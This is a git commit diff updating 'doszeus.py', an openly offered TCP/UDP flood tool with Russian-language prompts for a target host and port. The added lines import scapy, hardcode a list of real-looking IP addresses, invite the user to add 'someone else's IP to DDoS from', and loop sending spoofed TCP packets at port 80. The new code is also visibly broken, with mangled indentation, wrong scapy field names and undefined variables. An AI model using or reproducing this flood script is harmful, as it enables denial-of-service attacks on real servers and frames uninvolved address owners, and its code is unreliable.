dbb2e2df9ce5c9fc794401c9ac2a88e5e7d2cc69
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-08 22:44:34 +0300

    Update doszeus.py

--- doszeus.py
+++ doszeus.py
@@ -7,14 +7,35 @@ import threading
 import sys
 import os
 from os import system, name
+from random import choice
+import requests
+import socket
+try:
+    from scapy.all import *
+    from scapy.layers.inet import TCP, IP
+    is_erroring = True
+except:
+    pass
+
+# http://m.bibika.ru/
 os.system("clear")
 print("З А Г Р У З К А....")
 time.sleep(2.5)
 os.system("clear")
 
+# http://m.bibika.ru/
+
+
 print("###########################")
 print("###### TCP/UDP FLOOD ######")
 print("###########################")
+ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
+
+if input('Вы хотите ввести чужой IP для DDoS с него? (y/n) ') == 'y':
+    user_ip = input('Введите IP: => ')
+    ips.append(user_ip)
+
+
 ip = str(input(" HOST/IP:=> "))
 port = int(input(" PORT:=> "))
 choice = str(input(" UDP(Y/N):=> "))	
@@ -30,6 +51,16 @@ def run():
 			for x in range(times):
 				s.sendto(data,addr)
 			print(i +" ATTACK!!!")
-		except:
+
+                       ip = choice(ips)
+                       port = int(choice(ports))
+
+         while True:
+                    IP1 = IP(source_IP=choice(ips), destination=target)
+                    TCP1 = TCP(srcport=choice(ips), dstport=80)
+                    pkt = IP1 / TCP1
+                    send(pkt, inter=.001)
+	
+	except:
 			print("[!] ATTACK!!!")
 			
